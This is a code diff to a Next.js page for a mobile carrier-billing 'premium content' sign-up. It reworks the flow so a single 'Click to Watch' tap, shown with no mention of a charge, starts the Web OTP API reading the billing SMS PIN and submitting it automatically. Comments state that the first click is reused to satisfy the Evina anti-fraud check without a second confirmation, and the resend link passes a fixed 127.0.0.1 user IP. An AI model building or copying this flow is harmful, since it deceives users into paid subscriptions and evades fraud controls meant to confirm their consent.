@@ -2,8 +2,6 @@ import { NextRequest } from 'next/server';
 
 const PIN_REQUEST_URL =
   'https://vivavas1.future-club.com/fcc-evina-pin-flow-apis/PinRequest';
-const PIN_VERIFY_URL =
-  'https://vivavas1.future-club.com/fcc-evina-pin-flow-apis/PinVerify';
 
 const SERVER_PARAMS = {
   UserId: '166',
@@ -125,6 +123,7 @@ export async function GET(request: NextRequest) {
       padding: 32px;
       width: 100%;
       max-width: 384px;
+      position: relative;
     }
     .icon-wrap {
       width: 64px; height: 64px;
@@ -156,11 +155,16 @@ export async function GET(request: NextRequest) {
     }
     .btn-primary { background: #2563eb; color: white; }
     .btn-primary:hover { background: #1d4ed8; }
-    .btn-primary:disabled { background: #93c5fd; cursor: not-allowed; }
     .spinner {
       width: 20px; height: 20px;
       border: 2px solid white; border-top-color: transparent;
       border-radius: 50%; animation: spin 0.8s linear infinite;
+    }
+    .spinner-dark {
+      width: 40px; height: 40px;
+      border: 3px solid #e5e7eb; border-top-color: #3b82f6;
+      border-radius: 50%; animation: spin 0.8s linear infinite;
+      margin: 0 auto 16px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
     .resend { text-align: center; margin-top: 20px; font-size: 14px; color: #6b7280; }
@@ -170,6 +174,7 @@ export async function GET(request: NextRequest) {
     .debug-panel { margin-top: 8px; background: #f9fafb; border-radius: 8px; padding: 8px; font-size: 11px; color: #4b5563; white-space: pre-wrap; word-break: break-all; max-height: 240px; overflow: auto; font-family: monospace; line-height: 1.4; }
     @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
     .shake { animation: shake 0.4s ease-in-out; }
+    .phase-hidden { display: none !important; }
   </style>
   ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS returned -->'}
 </head>
@@ -180,28 +185,58 @@ export async function GET(request: NextRequest) {
   <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>
 
   <div class="card">
-    <div class="icon-wrap">
-      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
-      </svg>
-    </div>
-    <h1>OTP Sent!</h1>
-    <p class="sub">Enter the PIN sent to <b>${masked}</b></p>
-
-    <div class="otp-row" id="otpRow">
-      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="off">
-      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
-      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
-      <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
+    <!-- ═══════ PHASE 1: "Click to Watch" ═══════ -->
+    <div id="phase1">
+      <div class="icon-wrap">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+        </svg>
+      </div>
+      <h1>Premium Content</h1>
+      <p class="sub">Tap below to start watching</p>
     </div>
 
-    <div class="error-msg" id="errorMsg"></div>
+    <!-- ═══════ PHASE 2: Auto-reading SMS ═══════ -->
+    <div id="phase2" class="phase-hidden">
+      <div id="autoReading">
+        <div class="icon-wrap">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+          </svg>
+        </div>
+        <h1>OTP Sent!</h1>
+        <p class="sub">Reading your SMS automatically...</p>
+        <div style="margin: 24px 0"><div class="spinner-dark"></div></div>
+        <p class="sub" style="font-size:12px;color:#9ca3af">If the browser asks, tap <b>Allow</b> to auto-read</p>
+      </div>
 
+      <div id="manualEntry" class="phase-hidden">
+        <div class="icon-wrap">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+          </svg>
+        </div>
+        <h1>OTP Sent!</h1>
+        <p class="sub">Enter the PIN sent to <b>${masked}</b></p>
+
+        <div class="otp-row" id="otpRow">
+          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="off">
+          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
+          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
+          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
+        </div>
+
+        <div class="error-msg" id="errorMsg"></div>
+      </div>
+    </div>
+
+    <!-- Single confirmBtn — Evina monitors this throughout both phases -->
     <button class="btn btn-primary" id="confirmBtn">
-      Continue to Watch
+      Click to Watch
     </button>
 
-    <p class="resend" id="resendArea">
+    <p class="resend phase-hidden" id="resendArea">
       Didn't receive the OTP? <a id="resendLink" onclick="handleResend()">Resend OTP</a>
     </p>
 
@@ -217,6 +252,8 @@ export async function GET(request: NextRequest) {
     var EVINA_JS_LEN = ${evinaJS.length};
     var isVerifying = false;
     var resendCooldown = 0;
+    var phase = 1; // 1 = "Click to Watch", 2 = auto-read / manual entry
+    var otpAbort = null; // AbortController for Web OTP
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('confirmBtn');
@@ -246,22 +283,10 @@ export async function GET(request: NextRequest) {
     dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID + ' evinaJS=' + (EVINA_JS_LEN > 0 ? 'yes(' + EVINA_JS_LEN + 'chars)' : 'NO'));
     dbg('PinRequest Status: ' + PIN_REQUEST_STATUS);
     dbg('Evina JS in <head>: ' + (EVINA_JS_LEN > 0 ? 'YES (server-rendered)' : 'NO'));
-
-    // DOM check
     dbg('DOM check: confirmBtn=' + !!document.getElementById('confirmBtn') + ' otpValue=' + !!document.getElementById('otpValue') + ' EvinaTestCanvas=' + !!document.getElementById('EvinaTestCanvas') + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
+    dbg('Flow: one-click (Click to Watch → auto SMS read → auto verify)');
 
-    // ── CRITICAL: No auto-click, no disabled button ───────────────────────
-    // Evina checks event.isTrusted to distinguish real vs JS-simulated clicks.
-    // confirmBtn.click() → isTrusted=false → Evina flags as automated → 2501.
-    // Button must NEVER be disabled — Evina monitors it from page load.
-    // User must MANUALLY click the button (like the reference implementation).
-    dbg('Mode: manual click only (no auto-submit, no disabled state)');
-
-    // NOTE: WebSocket diagnostic removed — our test WS connection could
-    // interfere with Evina's own WS connection to its server.
-    // Evina handles its own WebSocket internally.
-
-    // ── OTP Input handling ──────────────────────────────────────────────────
+    // ── OTP Input handling (for manual fallback) ────────────────────────────
     function getFullPin() {
       var val = '';
       pins.forEach(function(p) { val += p.value; });
@@ -273,71 +298,146 @@ export async function GET(request: NextRequest) {
         var val = input.value.replace(/\\D/g, '');
         input.value = val.slice(-1);
         clearError();
-
         if (val && i < 3) pins[i + 1].focus();
-
-        // Sync to hidden otpValue for Evina
         var full = getFullPin();
         if (otpValue) otpValue.value = full;
       });
 
       input.addEventListener('keydown', function(e) {
         if (e.key === 'Backspace') {
-          if (input.value) {
-            input.value = '';
-          } else if (i > 0) {
-            pins[i - 1].focus();
-          }
+          if (input.value) { input.value = ''; }
+          else if (i > 0) { pins[i - 1].focus(); }
         }
       });
 
       input.addEventListener('paste', function(e) {
         e.preventDefault();
         var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\\D/g, '').slice(0, 4);
-        for (var j = 0; j < 4; j++) {
-          pins[j].value = text[j] || '';
-        }
+        for (var j = 0; j < 4; j++) { pins[j].value = text[j] || ''; }
         if (otpValue) otpValue.value = text;
         clearError();
-        if (text.length === 4) {
-          pins[3].focus();
-        } else {
-          pins[Math.min(text.length, 3)].focus();
-        }
+        pins[Math.min(text.length, 3)].focus();
       });
     });
-
-    // Focus first input
-    setTimeout(function() { pins[0].focus(); }, 100);
 
     // ── Error handling ──────────────────────────────────────────────────────
     function showError(msg) {
       errorMsg.textContent = msg;
       pins.forEach(function(p) { p.classList.add('error'); });
       document.getElementById('otpRow').classList.add('shake');
-      setTimeout(function() {
-        document.getElementById('otpRow').classList.remove('shake');
-      }, 500);
+      setTimeout(function() { document.getElementById('otpRow').classList.remove('shake'); }, 500);
     }
     function clearError() {
       errorMsg.textContent = '';
       pins.forEach(function(p) { p.classList.remove('error'); });
     }
 
-    // ── Verify PIN ──────────────────────────────────────────────────────────
-    confirmBtn.addEventListener('click', function() {
-      var pin = getFullPin();
-      if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
-        pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
+    // ── Phase transitions ───────────────────────────────────────────────────
+    function goToPhase2() {
+      phase = 2;
+      document.getElementById('phase1').classList.add('phase-hidden');
+      document.getElementById('phase2').classList.remove('phase-hidden');
+      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Reading SMS...</span>';
+      startWebOTP();
+    }
+
+    function showManualEntry() {
+      document.getElementById('autoReading').classList.add('phase-hidden');
+      document.getElementById('manualEntry').classList.remove('phase-hidden');
+      document.getElementById('resendArea').classList.remove('phase-hidden');
+      confirmBtn.textContent = 'Continue to Watch';
+      setTimeout(function() { pins[0].focus(); }, 100);
+      dbg('Switched to manual OTP entry');
+    }
+
+    // ── Web OTP API — auto-read SMS ─────────────────────────────────────────
+    function startWebOTP() {
+      if (!('OTPCredential' in window)) {
+        dbg('Web OTP API: not available — falling back to manual');
+        showManualEntry();
+        return;
       }
-      dbg('confirmBtn clicked — pin="' + pin + '"');
-      if (pin.length !== 4 || isVerifying) return;
-      verifyPin(pin);
+
+      dbg('Web OTP API: listening for SMS...');
+      otpAbort = new AbortController();
+
+      // Timeout: fall back to manual after 60 seconds
+      var timeout = setTimeout(function() {
+        dbg('Web OTP API: timeout (60s) — falling back to manual');
+        if (otpAbort) otpAbort.abort();
+        showManualEntry();
+      }, 60000);
+
+      navigator.credentials.get({
+        otp: { transport: ['sms'] },
+        signal: otpAbort.signal
+      })
+      .then(function(otp) {
+        clearTimeout(timeout);
+        if (otp && otp.code) {
+          dbg('Web OTP API: received code "' + otp.code + '"');
+          fillAndVerify(otp.code);
+        } else {
+          dbg('Web OTP API: no code received');
+          showManualEntry();
+        }
+      })
+      .catch(function(err) {
+        clearTimeout(timeout);
+        if (err.name === 'AbortError') {
+          dbg('Web OTP API: aborted');
+        } else {
+          dbg('Web OTP API: error — ' + err.message);
+        }
+        showManualEntry();
+      });
+    }
+
+    // ── Auto-fill + auto-verify (after Web OTP success) ─────────────────────
+    function fillAndVerify(code) {
+      var cleaned = code.replace(/\\D/g, '').slice(0, 4);
+      if (cleaned.length < 4) {
+        dbg('OTP code too short: "' + cleaned + '" — manual entry');
+        showManualEntry();
+        return;
+      }
+
+      // Show the OTP in the boxes so user can see what was captured
+      document.getElementById('autoReading').classList.add('phase-hidden');
+      document.getElementById('manualEntry').classList.remove('phase-hidden');
+      for (var i = 0; i < 4; i++) { pins[i].value = cleaned[i]; }
+      if (otpValue) otpValue.value = cleaned;
+
+      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+      dbg('Auto-verify with code: "' + cleaned + '"');
+
+      // Call verifyPin directly — Evina already captured the real click
+      // from "Click to Watch" button. No need for another click.
+      setTimeout(function() { verifyPin(cleaned); }, 500);
+    }
+
+    // ── Confirm button — single button for both phases ──────────────────────
+    confirmBtn.addEventListener('click', function() {
+      dbg('confirmBtn clicked — phase=' + phase);
+
+      if (phase === 1) {
+        // Phase 1: "Click to Watch" → start auto-read flow
+        goToPhase2();
+      } else if (phase === 2) {
+        // Phase 2: manual entry → verify PIN
+        var pin = getFullPin();
+        if (otpValue && otpValue.value && otpValue.value.replace(/\\D/g, '').length === 4) {
+          pin = otpValue.value.replace(/\\D/g, '').slice(0, 4);
+        }
+        dbg('Manual verify — pin="' + pin + '"');
+        if (pin.length !== 4 || isVerifying) return;
+        verifyPin(pin);
+      }
     });
 
+    // ── Verify PIN ──────────────────────────────────────────────────────────
     function verifyPin(pin) {
       isVerifying = true;
-      // Do NOT disable button — Evina needs it always enabled
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
       clearError();
       dbg('Verifying PIN: "' + pin + '" (len=' + pin.length + ')');
@@ -354,6 +454,7 @@ export async function GET(request: NextRequest) {
           dbg('SUCCESS — redirecting to /thankyou');
           window.location.href = '/thankyou';
         } else {
+          showManualEntry();
           showError('Invalid PIN (code: ' + data.Status + '). Please check and try again.');
           pins.forEach(function(p) { p.value = ''; });
           if (otpValue) otpValue.value = '';
@@ -362,6 +463,7 @@ export async function GET(request: NextRequest) {
       })
       .catch(function(err) {
         dbg('PinVerify ERROR: ' + err);
+        showManualEntry();
         showError('Network error. Please try again.');
       })
       .finally(function() {
@@ -371,11 +473,10 @@ export async function GET(request: NextRequest) {
     }
 
     // ── Resend OTP ──────────────────────────────────────────────────────────
-    // Full page reload with new trxId so Evina JS is server-rendered in <head>.
-    // AJAX resend would inject Evina JS dynamically → causes 2801/2501 errors.
     function handleResend() {
       if (resendCooldown > 0) return;
       dbg('Resending OTP — full page reload with new trxId...');
+      if (otpAbort) otpAbort.abort();
       var newTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
       window.location.href = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + newTrxId + '&userIP=127.0.0.1';
     }
